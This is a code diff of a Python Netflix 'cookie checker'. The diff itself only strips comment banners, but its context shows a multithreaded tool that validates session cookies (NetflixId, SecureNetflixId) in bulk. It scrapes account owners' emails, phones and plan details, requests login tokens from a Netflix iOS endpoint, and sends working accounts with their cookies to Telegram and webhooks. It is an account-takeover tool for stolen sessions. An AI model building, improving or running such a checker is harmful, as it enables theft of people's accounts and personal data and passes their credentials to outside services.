@@ -17,9 +17,7 @@ except ImportError:
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ============================================================
 # CONFIG - EDIT THESE VALUES
-# ============================================================
 THREADS = 30
 TIMEOUT = 15
 
@@ -73,24 +71,18 @@ EMOJIS_IN_WEBHOOK = True
 # Display mode: "simple" or "log"
 DISPLAY_MODE = "simple"
 
-# ============================================================
 # CREATE FOLDERS
-# ============================================================
 for folder in [COOKIES_FOLDER, OUTPUT_FOLDER, FAILED_FOLDER, BROKEN_FOLDER]:
     os.makedirs(folder, exist_ok=True)
 
-# ============================================================
 # COLORS
-# ============================================================
 class C:
     R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
     M = '\033[95m'; C = '\033[96m'; W = '\033[97m'; D = '\033[90m'
     X = '\033[0m'; BOLD = '\033[1m'
 if os.name == 'nt': os.system('color')
 
-# ============================================================
 # COUNTRY DATA
-# ============================================================
 COUNTRIES = {
     "US":"USA","GB":"UK","CA":"Canada","AU":"Australia","DE":"Germany","FR":"France",
     "IN":"India","BR":"Brazil","MX":"Mexico","ES":"Spain","IT":"Italy","NL":"Netherlands",
@@ -112,9 +104,7 @@ def country_flag(code):
     try: return chr(127397 + ord(code[0])) + chr(127397 + ord(code[1]))
     except: return ""
 
-# ============================================================
 # MONTH ALIASES FOR DATE PARSING
-# ============================================================
 MONTH_ALIASES = {
     "january":1,"janvier":1,"janeiro":1,"enero":1,"gennaio":1,"jan":1,"styczen":1,
     "february":2,"fevrier":2,"fevereiro":2,"febrero":2,"febbraio":2,"feb":2,"luty":2,
@@ -130,9 +120,7 @@ MONTH_ALIASES = {
     "december":12,"decembre":12,"diciembre":12,"dicembre":12,"dec":12,"grudzien":12,
 }
 
-# ============================================================
 # NFToken API CONFIG
-# ============================================================
 NFTOKEN_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
 NFTOKEN_PARAMS = {
     "appVersion":"15.48.1","idiom":"phone","iosVersion":"15.8.5","isTablet":"false",
@@ -144,9 +132,7 @@ NFTOKEN_PARAMS = {
     "config":'{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
 }
 
-# ============================================================
 # GLOBAL STATS
-# ============================================================
 stats = {"total":0,"checked":0,"premium":0,"standard":0,"standard_with_ads":0,
          "basic":0,"mobile":0,"free":0,"extra_member_premium":0,
          "expired":0,"invalid":0,"duplicate":0,"errors":0}
@@ -155,9 +141,7 @@ guid_lock = threading.Lock()
 processed_emails = set()
 run_folder = datetime.now().strftime("run_%Y-%m-%d_%H-%M-%S")
 
-# ============================================================
 # HELPER FUNCTIONS
-# ============================================================
 def decode_value(value):
     if value is None: return None
     cleaned = html.unescape(str(value))
@@ -223,9 +207,7 @@ def normalize_phone(value, country_code=None):
         return f"+{prefix}{digits.lstrip('0')}"
     return cleaned
 
-# ============================================================
 # COOKIE PARSING
-# ============================================================
 REQUIRED_COOKIES = ["NetflixId","SecureNetflixId"]
 ALL_COOKIE_NAMES = {"NetflixId","SecureNetflixId","nfvdid","OptanonConsent",
                      "clSharedContext","profiles","cL","dsca","memclid","flwssn"}
@@ -320,9 +302,7 @@ def format_cookies_netscape(cookies):
         lines.append(f".netflix.com\tTRUE\t/\tTRUE\t9999999999\t{name}\t{value}")
     return '\n'.join(lines)
 
-# ============================================================
 # ACCOUNT INFO EXTRACTION
-# ============================================================
 def extract_account_info(text):
     """Extract ALL account info from Netflix page HTML/JSON"""
     info = {}
@@ -451,9 +431,7 @@ def extract_account_info(text):
     
     return info
 
-# ============================================================
 # PLAN DETECTION
-# ============================================================
 def derive_plan(info, is_subscribed):
     """Derive plan type from account info"""
     plan_name = decode_value(info.get('localizedPlanName','')) or ''
@@ -630,9 +608,7 @@ def format_account_output(info, cookies, is_subscribed, nftoken_data=None):
     
     return '\n'.join(lines), plan_key, plan_name
 
-# ============================================================
 # WEBHOOK FUNCTIONS
-# ============================================================
 def is_plan_allowed(plan_key, allowed_plans):
     if allowed_plans == "all": return True
     if isinstance(allowed_plans, str):
@@ -708,9 +684,7 @@ def send_telegram(info, cookies_str, is_subscribed, plan_key, plan_name, nftoken
         }, timeout=20)
     except: pass
 
-# ============================================================
 # MAIN CHECKER
-# ============================================================
 def check_single_account(cookies, source_file=""):
     """Check a single Netflix account"""
     result = {"status":"invalid","info":{},"cookies":cookies,"nftoken":None,"error":""}
@@ -775,10 +749,7 @@ def check_single_account(cookies, source_file=""):
         result["error"] = str(e)
     
     return result
-
-# ============================================================
 # ORCHESTRATOR
-# ============================================================
 def run_checker():
     """Main function"""
     os.system('cls' if os.name=='nt' else 'clear')
@@ -989,9 +960,7 @@ def run_checker():
     print(f"{C.D}Press Enter to exit...{C.X}", end='')
     input()
 
-# ============================================================
 # RUN
-# ============================================================
 if __name__ == "__main__":
     try:
         run_checker()
